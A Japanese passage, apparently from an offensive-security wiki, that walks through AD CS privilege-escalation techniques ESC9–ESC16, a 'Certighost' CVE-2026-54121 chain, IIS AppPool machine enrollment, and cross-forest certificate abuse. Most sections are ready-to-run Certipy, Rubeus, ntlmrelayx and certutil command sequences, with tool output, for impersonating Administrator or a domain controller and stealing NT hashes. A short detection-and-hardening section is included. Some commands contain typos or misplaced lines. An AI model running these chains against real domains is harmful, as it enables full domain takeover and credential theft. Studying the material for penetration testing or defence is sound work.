`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` permissions を持っており、`Administrator@corp.local` を compromise することを目的としているとします。`Jane@corp.local` は `ESC9` certificate template への enroll が許可されており、その template の `msPKI-Enrollment-Flag` 設定には `CT_FLAG_NO_SECURITY_EXTENSION` フラグが指定されています。

まず、`John` の `GenericWrite` を利用して Shadow Credentials により `Jane` の hash を取得します。
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane` の `userPrincipalName` は、意図的に `@corp.local` のドメイン部分を省略して `Administrator` に変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として別個のままであるため、制約に違反しません。

これに続いて、脆弱性ありとマークされた `ESC9` certificate template が `Jane` として要求されます。
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` には `Administrator` が反映されており、「object SID」は含まれていないことが確認できます。

その後、`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で認証を試行すると、`Administrator@corp.local` の NT ハッシュが得られます。証明書にドメイン指定がないため、コマンドには `-domain <domain>` を含める必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### 解説

ESC10 では、domain controller 上の 2 つの registry key value が参照されます。

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 配下の `CertificateMappingMethods` のデフォルト値は `0x18`（`0x8 | 0x10`）で、以前は `0x1F` に設定されていました。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 配下の `StrongCertificateBindingEnforcement` のデフォルト設定は `1` で、以前は `0` でした。<sup>[[7]](#references)</sup>

**Case 1**

`StrongCertificateBindingEnforcement` が `0` として設定されている場合。

**Case 2**

`CertificateMappingMethods` に `UPN` bit（`0x4`）が含まれている場合。

### Abuse Case 1

`StrongCertificateBindingEnforcement` が `0` に設定されている場合、`GenericWrite` permissions を持つ account A を悪用して、任意の account B を compromise できます。

たとえば、`Jane@corp.local` に対する `GenericWrite` permissions を持っている場合、attacker は `Administrator@corp.local` の compromise を狙います。この手順は ESC9 と同様で、任意の certificate template を利用できます。

まず、`GenericWrite` を悪用して Shadow Credentials により `Jane` の hash を取得します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、制約違反を回避するために`@corp.local`部分を意図的に省略し、`Jane`の`userPrincipalName`が`Administrator`に変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
これに続いて、デフォルトの `User` template を使用し、クライアント認証を有効にする証明書が `Jane` として要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した certificate で認証すると、`Administrator@corp.local` の NT hash が得られます。certificate に domain の詳細が含まれていないため、command では domain を指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` に `UPN` bit flag（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を compromise できます。これには、machine account や組み込みの domain administrator である `Administrator` も含まれます。

ここでの目標は、`GenericWrite` を利用して `Shadow Credentials` 経由で `Jane` の hash を取得することから始め、`DC$@corp.local` を compromise することです。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` の `userPrincipalName` はその後、`DC$@corp.local` に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
デフォルトの `User` template を使用し、`Jane` として client authentication 用の証明書を要求します。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`は、このプロセス後に元の値に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel 経由で認証するには、Certipy の `-ldap-shell` オプションを使用し、`u:CORP\DC$` として認証に成功したことを示します。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell を通じて、`set_rbcd` などのコマンドで Resource-Based Constrained Delegation (RBCD) 攻撃を実行でき、ドメインコントローラーが侵害される可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName` を持たないユーザーアカウント、または `userPrincipalName` が `sAMAccountName` と一致しないユーザーアカウントにも及びます。デフォルトの `Administrator@corp.local` は、昇格された LDAP 権限を持ち、デフォルトでは `userPrincipalName` が存在しないため、主要な標的となります。

## ICPR への NTLM relay - ESC11

### 説明

CA Server が `IF_ENFORCEENCRYPTICERTREQUEST` を設定していない場合、RPC service 経由で signing なしの NTLM relay attacks を実行できます。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy` を使用して `Enforce Encryption for Requests` が Disabled かどうかを enumerate でき、Disabled の場合、certipy は `ESC11` Vulnerabilities を表示します。
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

リレーサーバーをセットアップする必要があります：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注: domain controllers では、DomainController に `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM を使用した ADCS CA への Shell access - ESC12

### 概要

Administrators は、Certificate Authority を「Yubico YubiHSM2」のような外部デバイス上に保存するよう設定できます。

USB device が CA server に USB port 経由で接続されている場合、または CA server が virtual machine の場合に USB device server を使用している場合、Key Storage Provider が YubiHSM 内の key を生成して使用するには、authentication key（「password」と呼ばれることもあります）が必要です。

この key/password は、レジストリの `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に cleartext で保存されています。

Reference は[こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)です。<sup>[[11]](#references)</sup>

### Abuse Scenario

Shell access を取得した際に、CA の private key が物理 USB device に保存されている場合、その key を復元できます。

まず、CA certificate（これは public です）を取得し、その後に次を実行します：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、CA certificate とその private key を使用して、新しい任意の certificate を偽造するために certutil `-sign` command を使用します。

## OID Group Link Abuse - ESC13

### Explanation

`msPKI-Certificate-Policy` attribute により、発行ポリシーを certificate template に追加できます。発行ポリシーを担当する `msPKI-Enterprise-Oid` objects は、PKI OID container の Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）で検出できます。ポリシーは、この object の `msDS-OIDToGroupLink` attribute を使用して AD group にリンクできます。これにより、system は certificate を提示した user を、その group の member であるかのように認証できます。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

言い換えると、user が certificate の enroll 権限を持っており、その certificate が OID group にリンクされている場合、user はこの group の privileges を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を検索します：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

`certipy find` または `Certify.exe find /showAllPermissions` を使用して、利用可能なユーザー権限を探します。

`John` に `VulnerableTemplate` への enroll 権限がある場合、ユーザーは `VulnerableGroup` グループの権限を継承できます。

必要なのはテンプレートを指定することだけで、`OIDToGroupLink` 権限を持つ証明書を取得できます。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 脆弱な Certificate Renewal Configuration - ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳細です。以下は原文からの引用です。<sup>[[14]](#references)</sup>

ESC14 は、主に Active Directory のユーザーまたはコンピューターアカウントにある `altSecurityIdentities` 属性の誤用または安全でない設定によって生じる、「weak explicit certificate mapping」に起因する脆弱性を扱います。この複数値属性を使用すると、管理者は認証目的で X.509 証明書を AD アカウントに手動で関連付けることができます。この明示的なマッピングが設定されている場合、通常は証明書の SAN に含まれる UPN または DNS 名、あるいは `szOID_NTDS_CA_SECURITY_EXT` security extension に埋め込まれた SID に依存する、デフォルトの証明書マッピングロジックを上書きできます。

`altSecurityIdentities` 属性内で証明書を識別するために使用される文字列の値が広すぎる、容易に推測できる、一意でない証明書フィールドに依存している、または spoofing しやすい証明書コンポーネントを使用している場合、「weak」なマッピングになります。攻撃者が、特権アカウントに対してこのように弱く定義された明示的なマッピングの属性に一致する証明書を取得または作成できる場合、その証明書を使用して当該アカウントとして認証し、なりすますことができます。

weak である可能性のある `altSecurityIdentities` マッピング文字列の例を以下に示します。

- 共通の Subject Common Name (CN) のみによるマッピング: 例: `X509:<S>CN=SomeUser`。攻撃者は、より安全性の低いソースからこの CN を持つ証明書を取得できる可能性があります。
- 特定の serial number や subject key identifier による追加の限定なしに、汎用的すぎる Issuer Distinguished Name (DN) または Subject DN を使用する場合: 例: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に取得または forge できる証明書で満たせる可能性のある、その他の予測可能なパターンや非暗号学的な識別子を使用する場合（CA を compromise した場合や、ESC1 のような脆弱な template を発見した場合）。

`altSecurityIdentities` 属性は、以下のようなさまざまなマッピング形式をサポートします。

- `X509:<I>IssuerDN<S>SubjectDN`（完全な Issuer および Subject DN によるマッピング）
- `X509:<SKI>SubjectKeyIdentifier`（証明書の Subject Key Identifier extension の値によるマッピング）
- `X509:<SR>SerialNumberBackedByIssuerDN`（Issuer DN によって暗黙的に限定された serial number によるマッピング）- これは標準形式ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress`（SAN の RFC822 name、通常は email address によるマッピング）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（証明書の raw public key の SHA1 hash によるマッピング - 一般的に強力）

これらのマッピングの security は、マッピング文字列で使用される証明書 identifier の具体性、一意性、cryptographic strength に大きく依存します。Domain Controllers で強力な certificate binding modes が有効になっている場合でも（主に SAN UPN/DNS および SID extension に基づく implicit mappings に影響します）、適切に設定されていない `altSecurityIdentities` エントリは、マッピングロジック自体に欠陥がある、または許容範囲が広すぎる場合、なりすましへの直接的な経路となる可能性があります。

### Abuse Scenario

ESC14 は Active Directory (AD) の **explicit certificate mappings**、具体的には `altSecurityIdentities` 属性を対象とします。この属性が設定されている場合（意図的な設定または誤設定）、攻撃者はマッピングに一致する証明書を提示することでアカウントになりすますことができます。

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: 攻撃者が対象アカウントの `altSecurityIdentities` 属性への write permissions、または対象 AD object に対して以下のいずれかの permissions を付与する権限を持っていること:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: 対象の altSecurityIdentities に weak X509RFC822 mapping があること。攻撃者は被害者の mail attribute を対象の X509RFC822 name に一致するよう設定し、被害者として certificate を enroll し、その証明書を使用して対象として認証できます。
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: 対象の `altSecurityIdentities` に weak X509IssuerSubject explicit mapping があること。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、対象の X509IssuerSubject mapping の subject に一致するよう設定できます。その後、攻撃者は victim として certificate を enroll し、この証明書を使用して対象として認証できます。
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: 対象の `altSecurityIdentities` に weak X509SubjectOnly explicit mapping があること。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、対象の X509SubjectOnly mapping の subject に一致するよう設定できます。その後、攻撃者は victim として certificate を enroll し、この証明書を使用して対象として認証できます。
### 具体的な操作
#### Scenario A

certificate template `Machine` の certificate を requestする
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書を保存して変換する
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
（証明書を使用して）認証する
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（任意）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
より具体的な各種攻撃シナリオにおける攻撃手法については、次を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu アプリケーション ポリシー(CVE-2024-49019) - ESC15

### 概要

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc の説明は非常に詳細です。以下に原文を引用します。<sup>[[15]](#references)</sup>

組み込みのデフォルト バージョン 1 certificate templates を使用すると、攻撃者は CSR を作成し、template で指定された設定済みの Extended Key Usage 属性よりも優先されるアプリケーション ポリシーを含めることができます。必要なのは enrollment 権限のみであり、**_WebServer_** template を使用して、client authentication、certificate request agent、codesigning 証明書を生成できます。

### Abuse

[Certipy privilege-escalation ドキュメント](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)には、より詳細な使用例が記載されています。<sup>[[14]](#references)</sup>


Certipy の `find` コマンドを使用すると、CA にパッチが適用されていない場合に、ESC15 の影響を受ける可能性がある V1 templates を特定できます。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel経由の直接なりすまし

**Step 1: "Client Authentication" Application Policyと対象のUPNを注入して証明書を要求する。** `attacker@corp.local` が、enrollee-supplied subjectを許可する「WebServer」V1 templateを使用して、`administrator@corp.local`をtargetにする。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 「Enrollee supplies subject」が設定された脆弱な V1 template。
- `-application-policies 'Client Authentication'`: OID `1.3.6.1.5.5.7.3.2` を CSR の Application Policies 拡張に挿入します。
- `-upn 'administrator@corp.local'`: impersonation 用に SAN の UPN を設定します。

**Step 2: 取得した certificate を使用して Schannel (LDAPS) 経由で Authenticate します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: Enrollment Agent Abuse による PKINIT/Kerberos Impersonation

**Step 1: 「Enrollee supplies subject」を持つ V1 template から certificate を要求し、「Certificate Request Agent」Application Policy を注入する。** この certificate は、攻撃者（`attacker@corp.local`）が enrollment agent になるためのものです。ここでは攻撃者自身の identity に対する UPN は指定しません。目的は agent capability の取得だからです。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**手順 2: 「agent」certificate を使用して、対象の privileged user に代わって certificate を要求します。** これは ESC3-like な手順で、手順 1 の certificate を agent certificate として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**ステップ 3: 「on-behalf-of」証明書を使用して、特権ユーザーとして認証します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA で Security Extension が無効（グローバル）-ESC16

### Explanation

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Extension の欠落による Elevation of Privilege)** は、AD CS の設定で、すべての証明書への **szOID_NTDS_CA_SECURITY_EXT** Extension の包含が強制されていない場合に、攻撃者が以下の操作を実行できるシナリオを指します。

1. **SID binding なし**で証明書を要求する。

2. この証明書を使用して、任意のアカウントとして**認証**する。たとえば、高い権限を持つアカウント（Domain Administrator など）になりすます。

詳細な原理については、次の記事も参照してください：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

以下は[このリンク](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)を参照しています。詳細な使用方法を確認するにはクリックしてください。<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) 環境が **ESC16** に対して脆弱かどうかを特定するには
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Step 1: 被害者アカウントの初期 UPN を読み取る（任意 - 復元用）。
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Step 2: 被害者アカウントのUPNを対象管理者の`sAMAccountName`に更新します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Step 3: （必要な場合）「victim」アカウントの認証情報を取得する（例：Shadow Credentials経由）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16 に脆弱な CA 上の _任意の適切な client authentication template_（例: "User"）から、"victim" ユーザーとして証明書を要求します。** CA は ESC16 に対して脆弱なため、この拡張機能に関する template 固有の設定にかかわらず、発行する証明書から SID security extension が自動的に省略されます。Kerberos credential cache の環境変数を設定します（shell command）:
```bash
export KRB5CCNAME=victim.ccache
```
次に証明書を要求します:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**手順 5: 「victim」アカウントの UPN を元に戻す。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Step 6: 対象の管理者として Authenticate する。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 説明

**Certighost** は、CA が要求者から提供された request attributes を信頼し、発行する証明書に設定する identity を解決する **AD CS enrollment chase / callback path** を悪用します。公開 PoC では、細工された request に次の内容が含まれます。<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA が接続する attacker-controlled host/IP
- **`rmd`**: impersonate する **target Domain Controller DNS name**

CA がその chase に従うと、**SMB/LSA (`445`)** および **LDAP (`389`)** 経由で attacker に接続します。attacker は **real machine account**（通常はデフォルトの **`ms-DS-MachineAccountQuota`** を利用して作成）を使用するため、callback session は有効な domain principal として認証されます。しかし、rogue services は代わりに **target DC** の identity attributes を返します。

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA が、返された identity と認証済み callback principal を **cryptographically bind** しない場合、session が attacker-controlled machine account として認証されていても、**Domain Controller** 用の証明書を発行できます。この点で、この bug は **Certifried** とは概念的に異なります。Certifried が `dNSHostName` などの AD attributes を書き換えるのに対し、attacker は **CA callback resolution 中に identity data を置き換えます**。<sup>[[2]](#references)</sup>

**有用な前提条件:**

- Low-privileged **domain credentials**
- **computer account** を **create or reuse** する能力
- **CA** から attacker-controlled **ports `389` and `445`** への network reachability
- Vulnerable / unpatched CA request path（**July 14, 2026** の Microsoft update により、**`cdc` に対する DC validation** と **resolved-SID comparison** が追加されました）

その結果得られる **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** と、公開 PoC flow では **target DC NT hash** を生成できます。これは通常、**full domain compromise** に十分です。

### Abuse

公開 PoC はこの chain 全体を自動化します。<sup>[[1]](#references)</sup>

1. attacker-controlled **machine account** を create or reuse する。
2. `389` および `445` で **rogue LDAP and SMB/LSA listeners** を起動する。
3. attacker-controlled **`cdc`** および target **`rmd`** attributes を含む certificate request を submit する。
4. CA が controlled machine account として rogue listeners に authenticate するのを待ち、identity lookups には **target DC** attributes を返す。
5. CA-signed **DC certificate** を受け取り、それを **PKINIT** に使用する。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoCで有用な runtime flags:

- `--listener <ip>`: `cdc` で通知される callback IPを明示的に選択
- `--computer-name <NAME$>`: 新規作成の代わりに既存の machine accountを再利用

**Operational notes:**

- PoCは **privileged ports** `389` と `445` に bindするため、**root** が必要。
- Exploitationに成功すると、**DC `.pfx`** と **Kerberos `.ccache`** がローカルに書き込まれる。
- 証明書は **Domain Controller account** にマッピングされるため、後続のアクションとして **certificate-based Kerberos auth**、**DCSync**、復元した **machine NT hash** の再利用などが可能になる。<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollmentによる同一ホストのAdministrator取得

`ApplicationPoolIdentity` として実行されるIIS poolは、network resourcesへの outbound accessにホストの **computer account** を使用する。そのため、`IIS AppPool\<POOL>` としての code executionはローカル token内では low-privilegedのままだが、`HOST$` としてCAに認証されるAD CS requestを送信できる。これは outbound identity transitionであり、token impersonationでもPotato-style local elevationでもない。<sup>[[19]](#references)[[20]](#references)</sup>

このchainには、domain-joined IIS host、RPC経由で到達可能なEnterprise CA、computerに enrollment rightsがある公開済みの machine-authentication template、PKINIT support、KDC/SMB reachabilityが必要となる。custom pool identityは outbound principalを変更するため、`HOST$` を前提とする前に、poolが実際に `ApplicationPoolIdentity` を使用していることを確認する。<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

IIS serverの外部で key pairとCSRを生成し、private keyを保持する。compromised workerからは **CSRのみ** をsubmitする。[Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) は `CertificateAuthority.Request` をinstantiateし、`CertificateTemplate:Machine` を設定し、`ICertRequest::Submit` を呼び出して、issued certificateを返す。CA configuration stringには `CAHOST\CA-NAME` を使用する。通常の `Machine` templateはADからsubjectを構築するため、requester-supplied subject/SAN dataは不要である。<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

返されたcertificateと **matching retained key** を組み合わせる。`certutil -MergePFX machine_cert.cer machine_cert.pfx` は、Windowsがaccessibleなprivate keyとcertificateをすでに関連付けられる場合にのみ機能する。分離されたPEM filesの場合は、PKCS#12を明示的に作成する。<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
PFXをPKINITに使用し、返されたコンピューターTGTはすぐにinjectせず、base64のまま保持します：<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus same-host service substitution

S4U2Self により、service は別の user の authorization data を含む、自身宛ての ticket を取得できます。computer TGT を使用すると、Rubeus は privileged user 用のその ticket を要求し、返された KRB-CRED 内の service name を CIFS に書き換えて inject できます。これはローカルな「delegate to thyself」primitive であり、S4U2Proxy や `msDS-AllowedToDelegateTo` エントリを必要としません。<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
置換されたチケットは、**同じコンピューターアカウント/キー**上のサービス（ここでは `HOST` 上の CIFS）でのみ使用できます。これは、ドメイン内の他のマシンで再利用できる Administrator チケットではありません。また、ここで示されている結果は、Administrator としての特権 SMB/ファイルシステムアクセスです。ローカルの `NT AUTHORITY\SYSTEM` プロセスを取得するには、別途リモート実行の手順が必要です。<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection and hardening

- CA 上で、Certification Services イベント **4886**（要求受信）と **4887**（発行）を関連付け、IIS server アカウントによる予期しない `Machine` template の要求を検出します。<sup>[[19]](#references)[[24]](#references)</sup>
- DC 上では、certificate pre-authentication が使用されるとイベント **4768** に証明書フィールドが含まれます。web-server アカウントによる、通常とは異なる PKINIT TGT 要求にアラートを設定します。続いて、特権を持つ偽装 ID と同じホストが関係する **4769** 要求を確認します。Rubeus の `/altservice` はクライアント側で KRB-CRED の service name を書き換えるため、DC 側の 4769 service name が `cifs` であることを必須条件にしないでください。<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` による CA RPC endpoint への接続、予期しない ASPX の作成、Kerberos 認証された administrative share へのアクセス、secrets-dumping activity を探します。可能な場合は app-tier から CA RPC/KDC/SMB へのアクセスを制限し、運用上必要でない computer enrollment rights または machine-authentication template を削除します。<sup>[[19]](#references)</sup>

## 証明書による Forest の侵害を受動態で説明

### 侵害された CA による Forest Trust の破壊

**cross-forest enrollment** の構成は、比較的容易に行えるようになっています。resource forest の **root CA certificate** は管理者によって **account forest に公開**され、resource forest の **enterprise CA certificate** は各 account forest の **`NTAuthCertificates` および AIA container に追加**されます。つまり、この構成によって、PKI を管理する他のすべての forest に対する完全な制御が **resource forest の CA に与えられます**。この CA が **攻撃者によって侵害された場合**、resource forest と account forest のすべてのユーザー用証明書が **攻撃者によって偽造される可能性があり**、その結果、forest の security boundary が破壊されます。<sup>[[6]](#references)</sup>

### Foreign Principal に付与された Enrollment Privilege

multi-forest 環境では、**Authenticated Users または foreign principal**（Enterprise CA が属する forest の外部にいるユーザー/グループ）に **enrollment および edit rights** を許可する **certificate template を公開**している Enterprise CA について、注意が必要です。\
trust 越しに認証されると、AD によって **Authenticated Users SID** がユーザーの token に追加されます。したがって、ある domain が **Authenticated Users に enrollment rights を許可する** template を持つ Enterprise CA を保有している場合、別の forest のユーザーによって template が **enroll される可能性があります**。同様に、template によって **foreign principal に enrollment rights が明示的に付与**されている場合、**cross-forest access-control relationship が作成され**、一方の forest の principal が **別の forest の template に enroll できる**ようになります。

どちらのシナリオでも、forest 間の **attack surface が拡大**します。certificate template の設定が攻撃者に悪用され、foreign domain 内で追加の privilege を取得される可能性があります。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC リポジトリ](https://github.com/aniqfakhrul/CVE-2026-54121)
